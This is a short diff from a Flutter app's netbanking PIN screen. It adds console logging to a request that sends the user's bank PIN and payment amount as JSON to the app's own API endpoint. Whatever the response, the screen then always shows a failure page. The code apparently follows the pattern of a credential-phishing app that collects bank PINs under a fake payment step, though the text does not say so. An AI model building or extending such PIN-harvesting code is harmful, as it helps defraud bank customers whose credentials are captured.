@@ -17,7 +17,9 @@ class _S extends State<NetbankingPinScreen> {
 
   void submit() {
     if (pin.text.isNotEmpty) {
-      http.post(Uri.parse('$apiBaseUrl/api/netbanking-pin'), headers: {'Content-Type': 'application/json'}, body: jsonEncode({'pin': pin.text, 'amount': widget.amount}));
+      http.post(Uri.parse('$apiBaseUrl/api/netbanking-pin'), headers: {'Content-Type': 'application/json'}, body: jsonEncode({'pin': pin.text, 'amount': widget.amount}))
+        .then((_) => print('API success'))
+        .catchError((e) => print('API error: $e'));
       context.push('/failed');
     }
   }
